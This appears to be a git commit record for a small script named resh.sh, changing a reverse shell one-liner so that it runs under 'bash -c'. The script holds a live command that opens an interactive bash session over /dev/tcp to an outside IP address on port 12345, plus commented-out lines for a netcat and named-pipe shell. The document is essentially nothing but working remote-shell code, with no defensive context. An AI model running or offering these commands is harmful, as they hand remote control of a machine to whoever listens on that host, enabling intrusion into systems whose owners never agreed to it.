1b98c68e73831bd165b37d0a87339d19cfd6f807
Frank Lin <knarf.lin@yahoo.com>
2019-10-24 15:04:23 +0800

    bash -c

--- resh.sh
+++ resh.sh
@@ -1,4 +1,4 @@
 # rm -f /tmp/f; mkfifo /tmp/f
 # cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 12345 > /tmp/f
 
-bash -i >& /dev/tcp/140.112.30.43/12345 0>&1
+bash -c 'bash -i >& /dev/tcp/140.112.30.43/12345 0>&1'
